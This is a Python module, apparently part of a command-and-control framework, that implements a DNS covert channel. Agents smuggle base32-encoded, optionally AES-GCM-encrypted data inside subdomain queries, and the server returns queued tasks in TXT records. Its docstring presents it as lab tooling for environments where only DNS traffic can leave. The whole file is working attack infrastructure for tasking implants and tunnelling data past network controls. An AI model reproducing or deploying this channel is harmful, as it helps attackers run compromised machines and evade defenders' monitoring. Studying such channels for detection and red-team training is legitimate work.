"""
channels/dns.py — Canal alternativo DNS (covert channel para laboratorio).

Protocolo:
  QUERY:  <b32-payload>.<seq>.<agent_id-prefix>.c2.<dominio>  tipo TXT
  ANSWER: TXT con task siguiente troceada en chunks ≤255 bytes

Si DNS_SHARED_KEY esta definido (hex de 32 bytes), los payloads van
cifrados con AES-256-GCM antes de codificar en base32.

Util cuando solo sale trafico DNS del entorno del agente.
"""

from __future__ import annotations

import asyncio
import base64
import logging
import os
import struct

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from dnslib import QTYPE, RR, TXT, DNSRecord

from ..agent_manager import AgentManager

logger = logging.getLogger("c2.dns")

CHUNK = 200  # bytes por registro TXT
_DNS_AAD = b"dns-covert-aligo"


def _get_dns_key() -> bytes | None:
    raw = os.getenv("DNS_SHARED_KEY", "").strip()
    if not raw:
        return None
    try:
        key = bytes.fromhex(raw)
        if len(key) != 32:
            raise ValueError("DNS_SHARED_KEY debe ser exactamente 32 bytes (64 hex chars)")
        return key
    except Exception as exc:
        logger.warning("DNS_SHARED_KEY invalido: %s — canal operara SIN cifrado", exc)
        return None


def _dns_encrypt(data: bytes, key: bytes) -> bytes:
    nonce = os.urandom(12)
    ct = AESGCM(key).encrypt(nonce, data, _DNS_AAD)
    return nonce + ct


def _dns_decrypt(data: bytes, key: bytes) -> bytes:
    if len(data) < 13:
        raise ValueError("Payload cifrado demasiado corto")
    nonce, ct = data[:12], data[12:]
    return AESGCM(key).decrypt(nonce, ct, _DNS_AAD)


def _b32enc(data: bytes) -> str:
    return base64.b32encode(data).decode("ascii").rstrip("=")


def _b32dec(s: str) -> bytes:
    pad = (8 - len(s) % 8) % 8
    return base64.b32decode(s.upper() + "=" * pad)


class _DNSProtocol(asyncio.DatagramProtocol):
    """Protocolo UDP para asyncio."""

    def __init__(self, handler) -> None:
        self._handler = handler
        self._transport = None

    def connection_made(self, transport):
        self._transport = transport

    def datagram_received(self, data: bytes, addr):
        asyncio.create_task(self._handler(data, addr, self._transport))

    def error_received(self, exc):
        logger.warning("DNS UDP error: %s", exc)


class DNSChannel:
    """
    Escucha en UDP/DNS. Los agentes codifican mensajes en subdominios y
    reciben la respuesta TXT con la próxima task.
    """

    def __init__(self, manager: AgentManager, domain: str = "c2.lab", port: int = 5353) -> None:
        self.manager = manager
        self.domain = domain.lower().rstrip(".")
        self.port = port
        self._transport = None

    async def start(self) -> None:
        loop = asyncio.get_event_loop()
        self._transport, _ = await loop.create_datagram_endpoint(
            lambda: _DNSProtocol(self._handle),
            local_addr=("0.0.0.0", self.port),
        )
        logger.info("DNS channel listening on UDP/%d (domain: .%s)", self.port, self.domain)

    async def stop(self) -> None:
        if self._transport:
            self._transport.close()

    async def _handle(self, data: bytes, addr: tuple, transport) -> None:
        try:
            req = DNSRecord.parse(data)
        except Exception:
            return

        qname = str(req.q.qname).lower().rstrip(".")
        reply = req.reply()

        if not qname.endswith(self.domain):
            return

        # Extraer partes: <payload_b32>.<seq>.<agent_prefix>.c2.<dominio>
        suffix = qname[: -(len(self.domain) + 1)]
        parts = suffix.split(".")

        if len(parts) < 3:
            reply.add_answer(RR(req.q.qname, QTYPE.TXT, rdata=TXT("ERR:BAD_QUERY")))
            transport.sendto(reply.pack(), addr)
            return

        agent_prefix = parts[-1]
        _seq         = parts[-2]
        payload_b32  = ".".join(parts[:-2])
        dns_key      = _get_dns_key()

        # Decodificar (y descifrar si hay clave) el payload del agente
        try:
            raw_bytes = _b32dec(payload_b32.replace(".", ""))
            if dns_key:
                raw_bytes = _dns_decrypt(raw_bytes, dns_key)
            logger.debug("DNS agent_prefix=%s seq=%s payload=%s", agent_prefix, _seq, raw_bytes[:40])
        except Exception as exc:
            logger.debug("DNS payload no descifrado (ignorado): %s", exc)
            raw_bytes = b""

        # Buscar agente por prefijo del ID
        matched_agent = None
        for state in self.manager.all():
            if state.agent_id.replace("-", "")[:8] == agent_prefix[:8]:
                matched_agent = state
                break

        if matched_agent and not matched_agent.outbox.empty():
            task_msg  = matched_agent.outbox.get_nowait()
            task_bytes = task_msg.to_wire().encode("utf-8")
            # Cifrar respuesta si hay clave compartida
            if dns_key:
                task_bytes = _dns_encrypt(task_bytes, dns_key)
            chunks = [task_bytes[i : i + CHUNK] for i in range(0, len(task_bytes), CHUNK)]
            for chunk in chunks:
                reply.add_answer(RR(req.q.qname, QTYPE.TXT, rdata=TXT(_b32enc(chunk))))
            logger.info(
                "DNS: task entregada a %s (cifrada=%s, chunks=%d)",
                matched_agent.agent_id, bool(dns_key), len(chunks),
            )
        else:
            reply.add_answer(RR(req.q.qname, QTYPE.TXT, rdata=TXT("WAIT")))

        transport.sendto(reply.pack(), addr)
